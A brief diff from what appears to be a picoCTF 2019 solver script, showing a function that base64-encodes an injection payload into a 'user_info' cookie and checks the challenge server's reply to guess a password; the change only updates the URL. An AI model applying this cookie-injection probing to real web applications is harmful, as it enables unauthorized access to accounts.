@@ -10,7 +10,7 @@ def try_pwd(password):
         len(injection), injection).encode('utf-8')
     cookies = dict(user_info=base64.b64encode(payload).decode('utf-8'))
     r = requests.get(
-        "http://2019shell1.picoctf.com:62195/index.php?file=admin", cookies=cookies)
+        "https://2019shell1.picoctf.com/problem/62195/index.php?file=admin", cookies=cookies)
     return "Welcome" in r.text
 
 
